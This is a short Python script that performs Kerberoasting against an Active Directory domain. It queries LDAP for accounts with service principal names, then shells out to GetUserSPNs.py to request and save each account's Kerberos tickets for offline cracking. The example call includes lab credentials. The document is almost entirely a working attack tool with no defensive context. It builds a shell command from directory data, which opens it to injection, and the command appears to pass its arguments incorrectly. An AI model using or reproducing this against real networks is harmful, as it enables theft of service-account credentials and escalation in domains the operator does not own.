import subprocess
from ldap3 import Server, Connection, SUBTREE

def find_and_kerberoast_objects(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controller via LDAP
        server = Server(dc_ip, port=389)
        conn = Connection(server, user=f"{domain}\\{username}", password=password, authentication='NTLM', auto_bind=True)

        # Search for objects with SPNs set
        search_base = 'DC=' + ',DC='.join(domain.split('.'))
        search_filter = '(servicePrincipalName=*)'
        attributes = ['sAMAccountName', 'servicePrincipalName']
        conn.search(search_base, search_filter, SUBTREE, attributes=attributes)

        # Parse search result and kerberoast objects
        for entry in conn.entries:
            sAMAccountName = entry['sAMAccountName'].value
            print(f"Kerberoasting {sAMAccountName}...")
            cmd = f"GetUserSPNs.py -request -dc-ip {dc_ip} -outputfile {sAMAccountName}_tickets.txt {sAMAccountName}"
            subprocess.run(cmd, shell=True)

        conn.unbind()

    except Exception as e:
        print(f"Error while searching for kerberoastable objects or Kerberoasting: {e}")

# Example usage:
username = "ajman"
password = "DomainAdmin123!"
domain = "snaplabs.local"
dc_ip = "10.10.0.86"  # Replace with your domain controller's IP address

find_and_kerberoast_objects(username, password, domain, dc_ip)